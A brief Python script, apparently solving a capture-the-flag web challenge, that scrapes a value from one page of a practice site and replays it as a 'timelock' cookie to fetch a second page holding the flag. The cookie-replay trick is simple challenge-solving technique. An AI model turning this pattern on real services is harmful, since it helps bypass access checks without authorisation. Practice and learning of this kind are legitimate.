import urllib.request
import requests
#get the text value of a url and store to a variable
baseurl = "http://bulldoghax.com/secret/"
page1 = "spinner"
page2 = "codes"
 #read the response from the url
def read_response(url):
    #make a request to the url
    with urllib.request.urlopen(url) as response:
        #read the response
        the_page = response.read()
        #decode the response
        the_page = the_page.decode('utf-8')
        #return the response
        return the_page

codes = read_response(baseurl+page1)
codes = codes.split("\n")
codes = codes[14].split(">")
codes = codes[1].split("<")
print(codes[0])
cookievalue = codes[0]
#send the cookie value from the response to a second url
#and read the response

#use requests to send the cookie value to the url
#and read the response

with requests.Session() as s:
    #get the url
    url = baseurl+page2
    #set the cookie
    cookies = dict(timelock=cookievalue)
    #make the request
    r = s.get(url,cookies=cookies)
    #read the response
    print(r.text)
    #print the flag
   

